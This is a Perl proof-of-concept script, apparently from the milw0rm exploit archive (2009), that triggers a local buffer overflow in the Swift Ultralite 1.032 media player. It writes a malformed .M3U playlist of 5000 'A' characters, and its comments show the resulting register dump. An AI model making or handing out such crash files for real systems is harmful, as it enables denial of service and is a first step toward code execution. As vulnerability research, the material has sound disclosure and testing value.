#!/usr/bin/perl
# Found By :: HACK4LOVE
# hack4love@hotmail.com
# Swift Ultralite 1.032 (.M3U) Local Buffer Overflow PoC
############################################################
##EAX 00000000
##ECX FFFFFFFF
##EDX 004976F0 SwiftUlt.004976F0
##EBX 00000270
##ESP 0013F1CC
##EBP 00000000
##ESI 0013F31B ASCII"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
##EDI 41414141
##EIP 00410CE0 SwiftUlt.00410CE0
#############################################################
my $crash="\x41" x 5000;
open(myfile,'>>hack4love.m3u');
print myfile $crash;
##############################################################

# milw0rm.com [2009-08-31]
